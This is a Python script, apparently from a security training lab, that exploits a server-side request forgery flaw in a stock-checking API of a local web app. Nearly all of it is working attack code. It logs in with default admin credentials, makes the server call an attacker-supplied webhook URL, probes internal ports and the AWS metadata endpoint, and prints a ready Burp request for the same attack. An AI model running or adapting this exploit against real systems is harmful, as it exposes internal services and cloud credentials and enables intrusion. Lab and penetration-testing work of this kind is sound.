#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Vulnerability Test
=====================================================

This script demonstrates how to exploit the SSRF vulnerability 
in the stock checking API endpoint.

Usage:
1. Set up a webhook receiver (webhook.site, ngrok, etc.)
2. Capture the stock checking request in Burp Suite
3. Modify the stock_api_url parameter to point to your target
4. Observe the server making requests to your controlled endpoint

Author: Security Research Lab
"""

import requests
import json
import time
import sys

class SSRFExploit:
    def __init__(self, base_url="http://127.0.0.1:5002"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login(self, username="admin", password="admin123"):
        """Login to get session cookies"""
        print(f"🔑 Logging in as {username}...")
        
        # Get login page first
        response = self.session.get(f"{self.base_url}/login")
        if response.status_code != 200:
            print(f"❌ Failed to access login page: {response.status_code}")
            return False
            
        # Login
        login_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(f"{self.base_url}/login", data=login_data)
        if "dashboard" in response.url or response.status_code == 302:
            print("✅ Login successful")
            return True
        else:
            print("❌ Login failed")
            return False
    
    def test_ssrf_basic(self):
        """Test basic SSRF functionality with legitimate endpoint"""
        print("\n🔍 Testing basic SSRF functionality...")
        
        # Test with a legitimate API endpoint
        test_data = {
            'stock_api_url': 'https://jsonplaceholder.typicode.com/posts/1',
            'product_id': '1'
        }
        
        response = self.session.post(f"{self.base_url}/check_stock_api", data=test_data)
        
        if response.status_code == 200:
            result = response.json()
            print("✅ Basic SSRF test successful")
            print(f"   Status Code: {result.get('status_code')}")
            print(f"   Stock Count: {result.get('stock')}")
            return True
        else:
            print(f"❌ Basic SSRF test failed: HTTP {response.status_code}")
            return False
    
    def test_ssrf_webhook(self, webhook_url):
        """Test SSRF with webhook to demonstrate data exfiltration"""
        print(f"\n🎯 Testing SSRF with webhook: {webhook_url}")
        
        ssrf_data = {
            'stock_api_url': webhook_url,
            'product_id': '1'
        }
        
        try:
            response = self.session.post(f"{self.base_url}/check_stock_api", data=ssrf_data)
            result = response.json()
            
            print("✅ SSRF webhook test executed")
            print(f"   Server attempted connection to: {webhook_url}")
            print(f"   Response status: {result.get('status_code', 'unknown')}")
            print(f"   Check your webhook for incoming requests!")
            
            return True
            
        except Exception as e:
            print(f"❌ SSRF webhook test failed: {e}")
            return False
    
    def test_ssrf_internal_services(self):
        """Test SSRF against internal services"""
        print("\n🔒 Testing SSRF against internal services...")
        
        # Common internal service endpoints to test
        internal_targets = [
            'http://127.0.0.1:80',        # Local web server
            'http://127.0.0.1:8080',      # Common dev server
            'http://127.0.0.1:3000',      # Node.js default
            'http://localhost:5432',      # PostgreSQL
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata service
        ]
        
        successful_targets = []
        
        for target in internal_targets:
            print(f"   Testing: {target}")
            
            try:
                ssrf_data = {
                    'stock_api_url': target,
                    'product_id': '1'
                }
                
                response = self.session.post(f"{self.base_url}/check_stock_api", data=ssrf_data)
                result = response.json()
                
                status_code = result.get('status_code', 0)
                if status_code and status_code != 404:
                    successful_targets.append((target, status_code))
                    print(f"   ✅ Response from {target}: HTTP {status_code}")
                else:
                    print(f"   ❌ No response from {target}")
                    
            except Exception as e:
                print(f"   ❌ Error testing {target}: {e}")
        
        if successful_targets:
            print(f"\n🚨 SSRF Success! Accessible internal services:")
            for target, status in successful_targets:
                print(f"   - {target} (HTTP {status})")
        else:
            print("\n   No internal services detected (may still be vulnerable)")
            
        return len(successful_targets) > 0
    
    def generate_burp_request(self):
        """Generate a sample request for Burp Suite testing"""
        print("\n📋 Sample Burp Suite Request for SSRF Testing:")
        print("="*60)
        
        request_template = f"""POST /check_stock_api HTTP/1.1
Host: 127.0.0.1:5002
Cookie: session=<your-session-cookie>
Content-Type: application/x-www-form-urlencoded
Content-Length: XX

stock_api_url=https://webhook.site/YOUR-WEBHOOK-UUID&product_id=1"""
        
        print(request_template)
        print("="*60)
        print("📝 Instructions:")
        print("1. Replace YOUR-WEBHOOK-UUID with your actual webhook.site UUID")
        print("2. Copy your session cookie from browser")
        print("3. Send request and check webhook.site for incoming requests")
        print("4. Try other targets: http://127.0.0.1:80, http://169.254.169.254/latest/meta-data/")

def main():
    print("🎯 SSRF Vulnerability Exploitation Tool")
    print("="*50)
    
    # Check if webhook URL provided
    webhook_url = None
    if len(sys.argv) > 1:
        webhook_url = sys.argv[1]
        print(f"🌐 Using webhook URL: {webhook_url}")
    else:
        print("💡 Tip: Provide webhook URL as argument for webhook testing")
        print("   Example: python ssrf_exploit.py https://webhook.site/your-uuid")
    
    exploit = SSRFExploit()
    
    # Step 1: Login
    if not exploit.login():
        print("❌ Cannot proceed without successful login")
        return
    
    # Step 2: Test basic SSRF
    if not exploit.test_ssrf_basic():
        print("❌ Basic SSRF test failed - endpoint may not be vulnerable")
        return
    
    # Step 3: Test webhook if provided
    if webhook_url:
        exploit.test_ssrf_webhook(webhook_url)
    
    # Step 4: Test internal services
    exploit.test_ssrf_internal_services()
    
    # Step 5: Show Burp Suite instructions
    exploit.generate_burp_request()
    
    print("\n" + "="*50)
    print("🎓 SSRF Testing Complete!")
    print("🔍 Key Points:")
    print("- The stock_api_url parameter is vulnerable to SSRF")
    print("- Server makes HTTP requests to attacker-controlled URLs")
    print("- Can be used to scan internal networks, exfiltrate data")
    print("- Perfect for demonstrating SSRF in penetration testing")
    print("="*50)

if __name__ == "__main__":
    main()
